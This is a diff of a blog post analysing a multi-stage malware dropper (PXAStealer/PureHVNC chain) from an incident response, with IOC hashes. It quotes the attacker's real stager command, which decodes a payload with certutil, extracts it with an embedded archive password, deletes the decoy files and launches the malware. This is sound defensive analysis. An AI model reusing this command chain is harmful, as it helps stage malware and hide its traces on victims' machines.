@@ -5,11 +5,12 @@ categories: [Days of Security, Reverse Engineering, Incident Response, Malware A
 tags: [Malware Analysis]
 ---
 ## Intro
-This piece of malware was spotted in one of the incident for which I led the response. It was executed, undetected by Defender for Endpoint and garned a full fledged IR investigation. I will not mention the whole IR process as this focuses more on the analysis of the dropper which was a multi-stage heavily obfucated python script & C# binary. 
+This piece of malware was spotted in one of the incident for which I led the response. It was executed, undetected by Defender for Endpoint and garned a full fledged IR investigation. I will not mention the whole IR process as this focuses more on the analysis of the dropper which was a multi-stage heavily obfucated python script & C# binary.  
+To give more context to it. It was a PXAStealer attack as seen on [SentinelOne](https://www.sentinelone.com/labs/ghost-in-the-zip-new-pxa-stealer-and-its-telegram-powered-ecosystem/). SentinelOne focused more on the PXAStealer(DLL) aspect, whereas this one is a later step in the infection chain leading to persistence.  
 
 ### How we got here?
 The user received a phishing link on their personal email address and opened it on their corporate device and it started the infection. It originated through a  .lnk file which is consistent with previous PureHVNC infections. The .lnk file included a obfuscated script which initiated the download of a master zip archive.  
-That was followed by the creation more zip archives with .pdf extension which originated from master zip file and were extracted. Python launcher and all dependencies, including malware config file, were extracted from the zip archives in the "C:\Users\Public\Windows\" directory and it executed a python script in memory. I can't share the screenshots or more information as it might contain senstive information. From the very beginning, the attack happened mainly through memory only. Here's the initial stager command. 
+That was followed by the creation more zip archives with .pdf extension which originated from master zip file and were extracted. Python launcher, malicious dll and all dependencies, were extracted from the zip archives in the "C:\Users\Public\Windows\" directory and once the DLL was sideloaded into MS Word binary, it executed the below mentioned command and which in turn exectued python script in memory. I can't share the screenshots or more information as it might contain senstive information. From the very beginning, the attack happened mainly through memory only. Here's the initial stager command from the sideloaded DLL. 
 ```
 cmd /c cd "" && start "Google Ads Playbook.docx" && certutil -decode Document.pdf Invoice.pdf && images.png x -ibck -y -poX3ff7b6Bfi76keXy3xmSWnX0uqsFYur Invoice.pdf C:\\Users\\Public && del /s /q Document.pdf && del /s /q Invoice.pdf && del /s /q images.png && del /s /q "Contract Invoice.docx" && del /s /q "Evidence Report.docx" && cd C:\\Users\\Public\\Windows && start svchost.exe Lib\\images.png MR_Q_NEW_VER_BOT && exit && exit
 ```
@@ -177,7 +178,8 @@ Below are a couple of screenshots from wireshark. One with internet enabled and 
 #### IOCs 
 
 Hashes -  
-61c0515c70a2b451d3d59f9450e5bd060f73290214ae6a6990db6adc04d534a7 - Initial lnk file   
+61c0515c70a2b451d3d59f9450e5bd060f73290214ae6a6990db6adc04d534a7 - Initial lnk file  
+6a51160fd443d4ddf69e0424d494e12436fbe0898756eeae6c79c77718760516 - Sideloaded DLL   
 96637bc629ca866ab5aa176e7ccb3cff9f93c8f9d021520a97f527bfa9d56d7e - Wdckhgr_crypted - First stage after python execution  
 289c09d43faaae05702f477f648dfd336085983f8253f834acd24960469335b7 - Donut shellcode  
 5baa860a2ee10bc859f527c686ec8f25b74860fe5d0f9138f8c7aeeb8dade7f4 - Sydxj - Intermediary stage  
